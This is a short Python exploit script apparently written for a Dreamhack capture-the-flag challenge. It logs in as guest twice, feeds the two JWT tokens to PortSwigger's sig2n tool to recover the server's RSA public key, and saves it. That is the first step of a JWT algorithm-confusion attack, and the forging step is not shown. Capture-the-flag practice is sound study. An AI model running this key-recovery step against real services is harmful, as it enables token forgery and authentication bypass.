import requests
import time
import subprocess
import base64
import re
host = "host3.dreamhack.games:24475"
BASE_URL = f"http://{host}"

def get_token():
    s = requests.Session()
    data = {
        'username': 'guest',
        'password': 'guest'
    }
    response = s.post(f'{BASE_URL}/login', data=data)
    response.raise_for_status()  # HTTP 오류가 발생하면 예외를 발생시킵니다.
    return s.cookies['token']

tokens = []
for _ in range(2):
    tokens.append(get_token())
    time.sleep(1)

print("token1:", tokens[0])
print("token2:", tokens[1])

print("find pubkey")
output = subprocess.check_output(f'docker run --rm -it portswigger/sig2n {tokens[0]} {tokens[1]}', shell=True)
print(output)
base64_pub_key = re.findall(r'Base64 encoded x509 key: (.+)\r', output.decode())[0]
with open('pub.crt', 'wb') as f:
    f.write(base64.b64decode(base64_pub_key))